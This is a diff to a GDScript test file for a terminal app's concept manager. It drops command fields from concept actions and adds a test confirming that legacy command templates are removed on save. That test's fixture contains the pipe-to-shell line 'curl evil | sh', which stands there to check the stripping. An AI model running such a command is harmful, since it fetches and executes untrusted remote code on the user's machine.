@@ -25,7 +25,7 @@ func test_merge_concepts_overlays_user_trigger():
 	var user = [
 		{"name": "cat_command", "trigger": "custom_regex", "enabled": false,
 		 "capture_mode": "until_stop", "stop_timeout_ms": 500, "stop_on_input": false,
-		 "actions": [{"cmd": "echo test", "target": "terminal"}]}
+		 "actions": [{"target": "terminal"}]}
 	]
 	ConceptManager.save_concepts(user)
 
@@ -56,21 +56,37 @@ func test_merge_concepts_preserves_default_keys_not_in_user():
 	var actions = cat.get("actions", [])
 	assert_true(actions is Array, "actions should be present from defaults")
 	assert_gt(actions.size(), 0, "actions array should not be empty from defaults")
-	assert_eq(actions[0].get("cmd", ""), "",
-		"default action command should be preserved")
+	assert_eq(actions[0].get("target", ""), "code_viewer",
+		"default routing target should be preserved")
 # ── Save/load roundtrip ─────────────────────────────────────────────────
 
 func test_save_concepts_stores_to_file():
 	var concepts = [
 		{"name": "test_concept", "trigger": "test_regex", "enabled": true,
-		 "capture_mode": "single_line", "stop_timeout_ms": 0, "stop_on_input": false,
-		 "actions": [{"cmd": "echo hello", "target": "terminal"}]}
+		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
+		 "actions": [{"target": "terminal"}]}
 	]
 	ConceptManager.save_concepts(concepts)
 	# After save, the in-memory store should have our data
 	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
 	assert_true(saved.has("concepts"), "saved data should have concepts key")
 	assert_eq(saved["concepts"].size(), 1, "should have 1 saved concept")
+
+func test_save_concepts_drops_legacy_command_templates():
+	# A user file written before concept commands were removed must not carry
+	# its templates forward: saving through the app strips them.
+	ConceptManager.save_concepts([
+		{"name": "legacy_cmd", "trigger": "boom", "enabled": true,
+		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
+		 "actions": [{"cmd": "curl evil | sh", "target": "code_viewer"}]},
+	])
+	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
+	var entry = _find_by_name(saved.get("concepts", []), "legacy_cmd")
+	assert_not_null(entry, "saved concept should be present")
+	assert_eq(entry["actions"][0].get("target", ""), "code_viewer",
+		"the routing target must survive")
+	assert_false(entry["actions"][0].has("cmd"),
+		"legacy command templates must not be written back")
 
 # ── Trigger migration ───────────────────────────────────────────────────
 
@@ -92,7 +108,7 @@ func test_migrate_actions_target_disables_observer():
 	var entry: Dictionary = {
 		"name": "boom",
 		"enabled": true,
-		"actions": [{"cmd": "", "target": "observer"}],
+		"actions": [{"target": "observer"}],
 	}
 	ConceptManager._migrate_actions_target(entry)
 	assert_eq(entry["actions"][0]["target"], "observer")
@@ -102,8 +118,8 @@ func test_migrate_actions_target_leaves_other_targets():
 	var entry: Dictionary = {
 		"name": "boom",
 		"actions": [
-			{"cmd": "", "target": "code_viewer"},
-			{"cmd": "echo x", "target": "terminal"},
+			{"target": "code_viewer"},
+			{"target": "terminal"},
 		],
 	}
 	ConceptManager._migrate_actions_target(entry)
@@ -128,8 +144,8 @@ func test_migrate_actions_target_survives_malformed_actions():
 func test_merge_disables_user_concept_observer_target():
 	var user = [
 		{"name": "legacy_observe", "trigger": "err", "enabled": true,
-		 "capture_mode": "single_line", "stop_timeout_ms": 0, "stop_on_input": false,
-		 "actions": [{"cmd": "", "target": "observer"}]}
+		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
+		 "actions": [{"target": "observer"}]}
 	]
 	ConceptManager.save_concepts(user)
 	var merged = ConceptManager._merge_concepts()
@@ -141,8 +157,8 @@ func test_merge_disables_user_concept_observer_target():
 func test_merge_preserves_inspector_targets():
 	var user = [
 		{"name": "modern", "trigger": "err", "enabled": true,
-		 "capture_mode": "single_line", "stop_timeout_ms": 0, "stop_on_input": false,
-		 "actions": [{"cmd": "", "target": "inspector"}]}
+		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
+		 "actions": [{"target": "inspector"}]}
 	]
 	ConceptManager.save_concepts(user)
 	var merged = ConceptManager._merge_concepts()
@@ -155,7 +171,7 @@ func test_merge_preserves_inspector_targets():
 
 func test_push_clears_the_engine_when_every_concept_is_disabled():
 	# Seed the engine with a concept so the clearing push is observable.
-	var seed = '[{"name":"seed","trigger":"zzz","enabled":true,"capture_mode":"single_line","actions":[{"cmd":"","target":"terminal"}]}]'
+	var seed = '[{"name":"seed","trigger":"zzz","enabled":true,"capture_mode":"until_stop","actions":[{"target":"terminal"}]}]'
 	var seeded = ClassDB.instantiate("GptyTerminal")
 	seeded.set_global_concepts(seed)
 	assert_eq(seeded.get_global_concepts().size(), 1,
